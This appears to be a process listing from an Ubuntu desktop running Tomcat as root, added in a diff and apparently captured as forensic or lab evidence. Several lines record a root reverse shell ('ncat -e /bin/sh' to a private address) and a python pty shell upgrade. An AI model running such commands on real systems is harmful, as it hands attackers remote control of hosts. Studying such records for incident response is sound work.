@@ -1,0 +1,351 @@
+    PID USER                      STARTED COMMAND
+      1 root     Mon Nov 17 19:43:32 2025 /sbin/init splash
+      2 root     Mon Nov 17 19:43:32 2025 [kthreadd]
+      3 root     Mon Nov 17 19:43:32 2025 [pool_workqueue_release]
+      4 root     Mon Nov 17 19:43:32 2025 [kworker/R-rcu_gp]
+      5 root     Mon Nov 17 19:43:32 2025 [kworker/R-sync_wq]
+      6 root     Mon Nov 17 19:43:32 2025 [kworker/R-kvfree_rcu_reclaim]
+      7 root     Mon Nov 17 19:43:32 2025 [kworker/R-slub_flushwq]
+      8 root     Mon Nov 17 19:43:32 2025 [kworker/R-netns]
+     10 root     Mon Nov 17 19:43:32 2025 [kworker/0:1-events]
+     11 root     Mon Nov 17 19:43:32 2025 [kworker/0:0H-events_highpri]
+     12 root     Mon Nov 17 19:43:32 2025 [kworker/u512:0-ipv6_addrconf]
+     13 root     Mon Nov 17 19:43:32 2025 [kworker/R-mm_percpu_wq]
+     14 root     Mon Nov 17 19:43:32 2025 [rcu_tasks_kthread]
+     15 root     Mon Nov 17 19:43:32 2025 [rcu_tasks_rude_kthread]
+     16 root     Mon Nov 17 19:43:32 2025 [rcu_tasks_trace_kthread]
+     17 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/0]
+     18 root     Mon Nov 17 19:43:32 2025 [rcu_preempt]
+     19 root     Mon Nov 17 19:43:32 2025 [rcu_exp_par_gp_kthread_worker/1]
+     20 root     Mon Nov 17 19:43:32 2025 [rcu_exp_gp_kthread_worker]
+     21 root     Mon Nov 17 19:43:32 2025 [migration/0]
+     22 root     Mon Nov 17 19:43:32 2025 [idle_inject/0]
+     23 root     Mon Nov 17 19:43:32 2025 [cpuhp/0]
+     24 root     Mon Nov 17 19:43:32 2025 [cpuhp/1]
+     25 root     Mon Nov 17 19:43:32 2025 [idle_inject/1]
+     26 root     Mon Nov 17 19:43:32 2025 [migration/1]
+     27 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/1]
+     29 root     Mon Nov 17 19:43:32 2025 [kworker/1:0H-events_highpri]
+     30 root     Mon Nov 17 19:43:32 2025 [cpuhp/2]
+     31 root     Mon Nov 17 19:43:32 2025 [idle_inject/2]
+     32 root     Mon Nov 17 19:43:32 2025 [migration/2]
+     33 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/2]
+     34 root     Mon Nov 17 19:43:32 2025 [kworker/2:0-events]
+     35 root     Mon Nov 17 19:43:32 2025 [kworker/2:0H-kblockd]
+     36 root     Mon Nov 17 19:43:32 2025 [cpuhp/3]
+     37 root     Mon Nov 17 19:43:32 2025 [idle_inject/3]
+     38 root     Mon Nov 17 19:43:32 2025 [migration/3]
+     39 root     Mon Nov 17 19:43:32 2025 [ksoftirqd/3]
+     40 root     Mon Nov 17 19:43:32 2025 [kworker/3:0-cgroup_destroy]
+     41 root     Mon Nov 17 19:43:32 2025 [kworker/3:0H-events_highpri]
+     42 root     Mon Nov 17 19:43:32 2025 [kworker/u513:0-flush-8:0]
+     43 root     Mon Nov 17 19:43:32 2025 [kworker/u514:0-flush-8:0]
+     44 root     Mon Nov 17 19:43:32 2025 [kworker/u515:0-flush-8:0]
+     46 root     Mon Nov 17 19:43:32 2025 [kdevtmpfs]
+     47 root     Mon Nov 17 19:43:32 2025 [kworker/R-inet_frag_wq]
+     48 root     Mon Nov 17 19:43:32 2025 [kauditd]
+     49 root     Mon Nov 17 19:43:32 2025 [khungtaskd]
+     50 root     Mon Nov 17 19:43:32 2025 [oom_reaper]
+     52 root     Mon Nov 17 19:43:32 2025 [kworker/u513:2-ext4-rsv-conversion]
+     53 root     Mon Nov 17 19:43:32 2025 [kworker/R-writeback]
+     54 root     Mon Nov 17 19:43:32 2025 [kcompactd0]
+     55 root     Mon Nov 17 19:43:32 2025 [ksmd]
+     56 root     Mon Nov 17 19:43:32 2025 [khugepaged]
+     57 root     Mon Nov 17 19:43:32 2025 [kworker/R-kintegrityd]
+     58 root     Mon Nov 17 19:43:32 2025 [kworker/R-kblockd]
+     59 root     Mon Nov 17 19:43:32 2025 [kworker/R-blkcg_punt_bio]
+     60 root     Mon Nov 17 19:43:32 2025 [irq/9-acpi]
+     61 root     Mon Nov 17 19:43:32 2025 [kworker/3:1-events]
+     62 root     Mon Nov 17 19:43:33 2025 [kworker/R-tpm_dev_wq]
+     63 root     Mon Nov 17 19:43:33 2025 [kworker/R-ata_sff]
+     64 root     Mon Nov 17 19:43:33 2025 [kworker/R-md]
+     65 root     Mon Nov 17 19:43:33 2025 [kworker/R-md_bitmap]
+     66 root     Mon Nov 17 19:43:33 2025 [kworker/R-edac-poller]
+     67 root     Mon Nov 17 19:43:33 2025 [kworker/R-devfreq_wq]
+     68 root     Mon Nov 17 19:43:33 2025 [watchdogd]
+     71 root     Mon Nov 17 19:43:33 2025 [kworker/3:1H-kblockd]
+     72 root     Mon Nov 17 19:43:33 2025 [kswapd0]
+     73 root     Mon Nov 17 19:43:33 2025 [ecryptfs-kthread]
+     74 root     Mon Nov 17 19:43:33 2025 [kworker/R-kthrotld]
+     75 root     Mon Nov 17 19:43:33 2025 [irq/24-pciehp]
+     76 root     Mon Nov 17 19:43:33 2025 [irq/25-pciehp]
+     77 root     Mon Nov 17 19:43:33 2025 [irq/26-pciehp]
+     78 root     Mon Nov 17 19:43:33 2025 [irq/27-pciehp]
+     79 root     Mon Nov 17 19:43:33 2025 [irq/28-pciehp]
+     80 root     Mon Nov 17 19:43:33 2025 [irq/29-pciehp]
+     81 root     Mon Nov 17 19:43:33 2025 [irq/30-pciehp]
+     82 root     Mon Nov 17 19:43:33 2025 [irq/31-pciehp]
+     83 root     Mon Nov 17 19:43:33 2025 [irq/32-pciehp]
+     84 root     Mon Nov 17 19:43:33 2025 [irq/33-pciehp]
+     85 root     Mon Nov 17 19:43:33 2025 [irq/34-pciehp]
+     86 root     Mon Nov 17 19:43:33 2025 [irq/35-pciehp]
+     87 root     Mon Nov 17 19:43:33 2025 [irq/36-pciehp]
+     88 root     Mon Nov 17 19:43:33 2025 [irq/37-pciehp]
+     89 root     Mon Nov 17 19:43:33 2025 [irq/38-pciehp]
+     90 root     Mon Nov 17 19:43:33 2025 [irq/39-pciehp]
+     91 root     Mon Nov 17 19:43:33 2025 [irq/40-pciehp]
+     92 root     Mon Nov 17 19:43:33 2025 [irq/41-pciehp]
+     93 root     Mon Nov 17 19:43:33 2025 [irq/42-pciehp]
+     94 root     Mon Nov 17 19:43:33 2025 [irq/43-pciehp]
+     95 root     Mon Nov 17 19:43:33 2025 [irq/44-pciehp]
+     96 root     Mon Nov 17 19:43:33 2025 [irq/45-pciehp]
+     97 root     Mon Nov 17 19:43:33 2025 [irq/46-pciehp]
+     98 root     Mon Nov 17 19:43:33 2025 [irq/47-pciehp]
+     99 root     Mon Nov 17 19:43:33 2025 [irq/48-pciehp]
+    100 root     Mon Nov 17 19:43:33 2025 [irq/49-pciehp]
+    101 root     Mon Nov 17 19:43:33 2025 [irq/50-pciehp]
+    102 root     Mon Nov 17 19:43:33 2025 [irq/51-pciehp]
+    103 root     Mon Nov 17 19:43:33 2025 [irq/52-pciehp]
+    104 root     Mon Nov 17 19:43:33 2025 [irq/53-pciehp]
+    105 root     Mon Nov 17 19:43:33 2025 [irq/54-pciehp]
+    106 root     Mon Nov 17 19:43:33 2025 [irq/55-pciehp]
+    107 root     Mon Nov 17 19:43:33 2025 [kworker/1:1-events]
+    108 root     Mon Nov 17 19:43:33 2025 [kworker/R-acpi_thermal_pm]
+    109 root     Mon Nov 17 19:43:33 2025 [kworker/u514:1-events_power_efficient]
+    110 root     Mon Nov 17 19:43:33 2025 [scsi_eh_0]
+    111 root     Mon Nov 17 19:43:33 2025 [kworker/R-scsi_tmf_0]
+    112 root     Mon Nov 17 19:43:33 2025 [scsi_eh_1]
+    113 root     Mon Nov 17 19:43:33 2025 [kworker/R-scsi_tmf_1]
+    115 root     Mon Nov 17 19:43:33 2025 [kworker/u514:3-events_unbound]
+    116 root     Mon Nov 17 19:43:33 2025 [kworker/R-mld]
+    117 root     Mon Nov 17 19:43:33 2025 [kworker/R-ipv6_addrconf]
+    118 root     Mon Nov 17 19:43:33 2025 [kworker/1:1H-kblockd]
+    119 root     Mon Nov 17 19:43:33 2025 [kworker/u512:1-ipv6_addrconf]
+    126 root     Mon Nov 17 19:43:33 2025 [kworker/u514:4-flush-8:0]
+    129 root     Mon Nov 17 19:43:33 2025 [kworker/R-kstrp]
+    131 root     Mon Nov 17 19:43:33 2025 [kworker/u517:0]
+    133 root     Mon Nov 17 19:43:33 2025 [kworker/u519:0-ttm]
+    134 root     Mon Nov 17 19:43:33 2025 [kworker/u520:0-ttm]
+    135 root     Mon Nov 17 19:43:33 2025 [kworker/u521:0-ttm]
+    148 root     Mon Nov 17 19:43:33 2025 [kworker/R-charger_manager]
+    172 root     Mon Nov 17 19:43:33 2025 [kworker/2:1H-kblockd]
+    175 root     Mon Nov 17 19:43:33 2025 [kworker/0:1H-kblockd]
+    202 root     Mon Nov 17 19:43:33 2025 [kworker/1:2-cgroup_destroy]
+    203 root     Mon Nov 17 19:43:33 2025 [kworker/R-mpt_poll_0]
+    204 root     Mon Nov 17 19:43:33 2025 [kworker/R-mpt/0]
+    205 root     Mon Nov 17 19:43:33 2025 [kworker/u515:1-events_unbound]
+    216 root     Mon Nov 17 19:43:33 2025 [scsi_eh_2]
+    217 root     Mon Nov 17 19:43:33 2025 [kworker/R-scsi_tmf_2]
+    220 root     Mon Nov 17 19:43:34 2025 [scsi_eh_3]
+    221 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_3]
+    222 root     Mon Nov 17 19:43:34 2025 [scsi_eh_4]
+    223 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_4]
+    224 root     Mon Nov 17 19:43:34 2025 [scsi_eh_5]
+    225 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_5]
+    226 root     Mon Nov 17 19:43:34 2025 [scsi_eh_6]
+    227 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_6]
+    228 root     Mon Nov 17 19:43:34 2025 [scsi_eh_7]
+    229 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_7]
+    230 root     Mon Nov 17 19:43:34 2025 [scsi_eh_8]
+    231 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_8]
+    232 root     Mon Nov 17 19:43:34 2025 [scsi_eh_9]
+    233 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_9]
+    234 root     Mon Nov 17 19:43:34 2025 [scsi_eh_10]
+    235 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_10]
+    236 root     Mon Nov 17 19:43:34 2025 [scsi_eh_11]
+    237 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_11]
+    238 root     Mon Nov 17 19:43:34 2025 [scsi_eh_12]
+    239 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_12]
+    240 root     Mon Nov 17 19:43:34 2025 [scsi_eh_13]
+    241 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_13]
+    242 root     Mon Nov 17 19:43:34 2025 [scsi_eh_14]
+    243 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_14]
+    244 root     Mon Nov 17 19:43:34 2025 [scsi_eh_15]
+    245 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_15]
+    246 root     Mon Nov 17 19:43:34 2025 [scsi_eh_16]
+    247 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_16]
+    248 root     Mon Nov 17 19:43:34 2025 [scsi_eh_17]
+    249 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_17]
+    250 root     Mon Nov 17 19:43:34 2025 [scsi_eh_18]
+    251 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_18]
+    252 root     Mon Nov 17 19:43:34 2025 [scsi_eh_19]
+    253 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_19]
+    254 root     Mon Nov 17 19:43:34 2025 [scsi_eh_20]
+    255 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_20]
+    256 root     Mon Nov 17 19:43:34 2025 [scsi_eh_21]
+    257 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_21]
+    258 root     Mon Nov 17 19:43:34 2025 [scsi_eh_22]
+    259 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_22]
+    260 root     Mon Nov 17 19:43:34 2025 [scsi_eh_23]
+    261 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_23]
+    262 root     Mon Nov 17 19:43:34 2025 [scsi_eh_24]
+    263 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_24]
+    264 root     Mon Nov 17 19:43:34 2025 [scsi_eh_25]
+    265 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_25]
+    266 root     Mon Nov 17 19:43:34 2025 [scsi_eh_26]
+    267 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_26]
+    268 root     Mon Nov 17 19:43:34 2025 [scsi_eh_27]
+    269 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_27]
+    270 root     Mon Nov 17 19:43:34 2025 [scsi_eh_28]
+    271 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_28]
+    272 root     Mon Nov 17 19:43:34 2025 [scsi_eh_29]
+    273 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_29]
+    274 root     Mon Nov 17 19:43:34 2025 [scsi_eh_30]
+    275 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_30]
+    276 root     Mon Nov 17 19:43:34 2025 [scsi_eh_31]
+    277 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_31]
+    278 root     Mon Nov 17 19:43:34 2025 [scsi_eh_32]
+    279 root     Mon Nov 17 19:43:34 2025 [kworker/R-scsi_tmf_32]
+    303 root     Mon Nov 17 19:43:34 2025 [kworker/u516:26-flush-8:0]
+    304 root     Mon Nov 17 19:43:34 2025 [kworker/u516:27-events_freezable_pwr_efficient]
+    315 root     Mon Nov 17 19:43:34 2025 [kworker/u515:2-flush-8:0]
+    354 root     Mon Nov 17 19:43:37 2025 [jbd2/sda2-8]
+    355 root     Mon Nov 17 19:43:37 2025 [kworker/R-ext4-rsv-conversion]
+    403 root     Mon Nov 17 19:43:37 2025 /usr/lib/systemd/systemd-journald
+    425 root     Mon Nov 17 19:43:37 2025 [kworker/u513:3-events_freezable_pwr_efficient]
+    426 root     Mon Nov 17 19:43:37 2025 [kworker/u513:4-flush-8:0]
+    431 root     Mon Nov 17 19:43:37 2025 [kworker/0:2-cgroup_destroy]
+    438 root     Mon Nov 17 19:43:37 2025 [kworker/2:2-cgroup_destroy]
+    457 root     Mon Nov 17 19:43:37 2025 /usr/lib/systemd/systemd-udevd
+    526 root     Mon Nov 17 19:43:37 2025 [psimon]
+    571 root     Mon Nov 17 19:43:37 2025 [kworker/u515:4-events_unbound]
+    573 systemd+ Mon Nov 17 19:43:37 2025 /usr/lib/systemd/systemd-oomd
+    578 systemd+ Mon Nov 17 19:43:37 2025 /usr/lib/systemd/systemd-resolved
+    580 systemd+ Mon Nov 17 19:43:37 2025 /usr/lib/systemd/systemd-timesyncd
+    697 root     Mon Nov 17 19:43:38 2025 [irq/57-vmw_vmci]
+    698 root     Mon Nov 17 19:43:38 2025 [irq/58-vmw_vmci]
+    699 root     Mon Nov 17 19:43:38 2025 [irq/59-vmw_vmci]
+    701 root     Mon Nov 17 19:43:38 2025 [irq/16-vmwgfx]
+    702 root     Mon Nov 17 19:43:38 2025 [kworker/R-ttm]
+    760 root     Mon Nov 17 19:43:38 2025 [kworker/R-cryptd]
+    997 avahi    Mon Nov 17 19:43:38 2025 avahi-daemon: running [meaow.local]
+    998 message+ Mon Nov 17 19:43:38 2025 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+   1002 gnome-r+ Mon Nov 17 19:43:38 2025 /usr/libexec/gnome-remote-desktop-daemon --system
+   1017 polkitd  Mon Nov 17 19:43:38 2025 /usr/lib/polkit-1/polkitd --no-debug
+   1023 root     Mon Nov 17 19:43:38 2025 /usr/libexec/power-profiles-daemon
+   1032 root     Mon Nov 17 19:43:38 2025 /usr/lib/snapd/snapd
+   1036 root     Mon Nov 17 19:43:38 2025 /usr/libexec/accounts-daemon
+   1037 root     Mon Nov 17 19:43:38 2025 /usr/sbin/cron -f -P
+   1040 root     Mon Nov 17 19:43:38 2025 /usr/libexec/switcheroo-control
+   1059 root     Mon Nov 17 19:43:38 2025 /usr/lib/systemd/systemd-logind
+   1065 root     Mon Nov 17 19:43:38 2025 /usr/libexec/udisks2/udisksd
+   1103 avahi    Mon Nov 17 19:43:38 2025 avahi-daemon: chroot helper
+   1106 syslog   Mon Nov 17 19:43:38 2025 /usr/sbin/rsyslogd -n -iNONE
+   1109 root     Mon Nov 17 19:43:38 2025 /usr/sbin/NetworkManager --no-daemon
+   1111 root     Mon Nov 17 19:43:38 2025 /usr/sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
+   1161 root     Mon Nov 17 19:43:39 2025 /usr/sbin/ModemManager
+   1271 root     Mon Nov 17 19:43:39 2025 /usr/sbin/cupsd -l
+   1274 root     Mon Nov 17 19:43:39 2025 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+   1291 root     Mon Nov 17 19:43:39 2025 /usr/sbin/gdm3
+   1305 cups-br+ Mon Nov 17 19:43:39 2025 /usr/sbin/cups-browsed
+   1307 kernoops Mon Nov 17 19:43:39 2025 /usr/sbin/kerneloops --test
+   1309 root     Mon Nov 17 19:43:39 2025 [psimon]
+   1311 kernoops Mon Nov 17 19:43:39 2025 /usr/sbin/kerneloops
+   1399 rtkit    Mon Nov 17 19:43:40 2025 /usr/libexec/rtkit-daemon
+   1506 root     Mon Nov 17 19:43:41 2025 [kworker/u520:2-ttm]
+   1521 colord   Mon Nov 17 19:43:41 2025 /usr/libexec/colord
+   1572 root     Mon Nov 17 19:43:41 2025 /usr/libexec/upowerd
+   1908 root     Mon Nov 17 19:43:52 2025 gdm-session-worker [pam/gdm-password]
+   1921 meaow    Mon Nov 17 19:43:54 2025 /usr/lib/systemd/systemd --user
+   1928 meaow    Mon Nov 17 19:43:54 2025 (sd-pam)
+   1937 meaow    Mon Nov 17 19:43:54 2025 /usr/bin/pipewire
+   1938 meaow    Mon Nov 17 19:43:54 2025 /usr/bin/pipewire -c filter-chain.conf
+   1945 meaow    Mon Nov 17 19:43:54 2025 /usr/bin/wireplumber
+   1951 meaow    Mon Nov 17 19:43:54 2025 /usr/bin/pipewire-pulse
+   1959 meaow    Mon Nov 17 19:43:54 2025 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+   1965 meaow    Mon Nov 17 19:43:54 2025 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+   2005 meaow    Mon Nov 17 19:43:54 2025 /usr/libexec/xdg-document-portal
+   2009 meaow    Mon Nov 17 19:43:54 2025 /usr/libexec/xdg-permission-store
+   2016 root     Mon Nov 17 19:43:54 2025 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+   2039 meaow    Mon Nov 17 19:43:54 2025 /usr/libexec/gdm-wayland-session env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
+   2044 meaow    Mon Nov 17 19:43:54 2025 /usr/libexec/gnome-session-binary --session=ubuntu
+   2106 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gcr-ssh-agent --base-dir /run/user/1000/gcr
+   2107 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gnome-session-ctl --monitor
+   2121 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gvfsd
+   2129 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+   2131 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gnome-session-binary --systemd-service --session=ubuntu
+   2169 meaow    Mon Nov 17 19:43:55 2025 /usr/bin/gnome-shell
+   2172 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/at-spi-bus-launcher --launch-immediately
+   2182 meaow    Mon Nov 17 19:43:55 2025 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus
+   2220 root     Mon Nov 17 19:43:55 2025 [kworker/u519:2-ttm]
+   2236 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/at-spi2-registryd --use-gnome-session
+   2253 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gnome-shell-calendar-server
+   2272 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/evolution-source-registry
+   2274 meaow    Mon Nov 17 19:43:55 2025 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
+   2288 meaow    Mon Nov 17 19:43:55 2025 /usr/bin/ibus-daemon --panel disable
+   2289 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-a11y-settings
+   2292 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-color
+   2296 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-datetime
+   2300 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-housekeeping
+   2301 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-keyboard
+   2308 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-media-keys
+   2309 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-power
+   2311 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-print-notifications
+   2312 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-rfkill
+   2313 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-screensaver-proxy
+   2316 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-sharing
+   2319 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-smartcard
+   2320 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-sound
+   2330 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-wacom
+   2332 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gsd-disk-utility-notify
+   2336 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/evolution-data-server/evolution-alarm-notify
+   2439 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/gvfs-udisks2-volume-monitor
+   2468 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/ibus-memconf
+   2476 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/ibus-extension-gtk3
+   2488 meaow    Mon Nov 17 19:43:55 2025 /usr/libexec/ibus-portal
+   2500 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/goa-daemon
+   2516 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gsd-printer
+   2530 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/goa-identity-service
+   2531 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gvfs-goa-volume-monitor
+   2541 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/evolution-calendar-factory
+   2549 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gvfs-afc-volume-monitor
+   2557 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gvfs-gphoto2-volume-monitor
+   2563 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gvfs-mtp-volume-monitor
+   2579 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/evolution-addressbook-factory
+   2615 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/ibus-engine-simple
+   2636 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/dconf-service
+   2646 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gvfsd-metadata
+   2647 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/gvfsd-trash --spawner :1.20 /org/gtk/gvfs/exec_spaw/0
+   2678 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/tracker-miner-fs-3
+   2701 meaow    Mon Nov 17 19:43:56 2025 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
+   2715 meaow    Mon Nov 17 19:43:56 2025 /usr/libexec/xdg-desktop-portal
+   2720 meaow    Mon Nov 17 19:43:57 2025 /usr/libexec/xdg-desktop-portal-gnome
+   2760 root     Mon Nov 17 19:43:57 2025 [kworker/u518:7-ttm]
+   2762 root     Mon Nov 17 19:43:57 2025 [kworker/u518:9-ttm]
+   2777 root     Mon Nov 17 19:43:57 2025 [kworker/u520:11-ttm]
+   2780 meaow    Mon Nov 17 19:43:57 2025 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
+   2820 meaow    Mon Nov 17 19:43:57 2025 /usr/libexec/xdg-desktop-portal-gtk
+   2841 meaow    Mon Nov 17 19:43:57 2025 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
+   2900 meaow    Mon Nov 17 19:43:57 2025 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
+   2923 root     Mon Nov 17 19:44:03 2025 [kworker/u513:5-kvfree_rcu_reclaim]
+   3132 meaow    Mon Nov 17 19:44:17 2025 /usr/libexec/gnome-terminal-server
+   3139 meaow    Mon Nov 17 19:44:17 2025 bash
+   3154 root     Mon Nov 17 19:44:26 2025 [kworker/u521:2-ttm]
+   3174 meaow    Mon Nov 17 19:44:55 2025 /usr/bin/update-notifier
+   3318 root     Mon Nov 17 19:45:58 2025 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.90/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.90/bin/bootstrap.jar:/opt/apache-tomcat-9.0.90/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.90 -Dcatalina.home=/opt/apache-tomcat-9.0.90 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.90/temp org.apache.catalina.startup.Bootstrap start
+   4129 root     Mon Nov 17 19:49:12 2025 [kworker/1:0]
+   4207 root     Mon Nov 17 19:50:09 2025 [kworker/u516:0-kvfree_rcu_reclaim]
+   4233 root     Mon Nov 17 19:50:59 2025 ncat -e /bin/sh 192.168.153.128 1234
+   4235 root     Mon Nov 17 19:50:59 2025 /bin/sh
+   4237 root     Mon Nov 17 19:51:26 2025 python3 -c import pty; pty.spawn("/bin/bash")
+   4238 root     Mon Nov 17 19:51:27 2025 /bin/bash
+   4558 meaow    Mon Nov 17 19:51:47 2025 /usr/bin/snap userd
+   5309 meaow    Mon Nov 17 19:51:54 2025 /snap/firefox/6565/usr/lib/firefox/firefox
+   5374 meaow    Mon Nov 17 19:51:55 2025 /snap/firefox/6565/usr/lib/firefox/crashhelper 5309 9 /tmp/ 10 12
+   5455 meaow    Mon Nov 17 19:51:55 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -ipcHandle 0 -signalPipe 1 -initialChannelId {4f681eb4-7129-4c96-98a4-07f6743401c2} -parentPid 5309 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 1 forkserver
+   5460 meaow    Mon Nov 17 19:51:55 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -prefsHandle 0:34424 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {1dd212b6-ae5f-456d-9acb-90000524688e} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 2 socket
+   5482 meaow    Mon Nov 17 19:51:55 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:34614 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {f545c41f-5981-4355-8e67-f33223d7cdaa} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 3 tab
+   5491 meaow    Mon Nov 17 19:51:55 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -prefsHandle 0:34614 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {cfc6874f-7b46-49d8-981c-f9e90c00f5ed} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 4 rdd
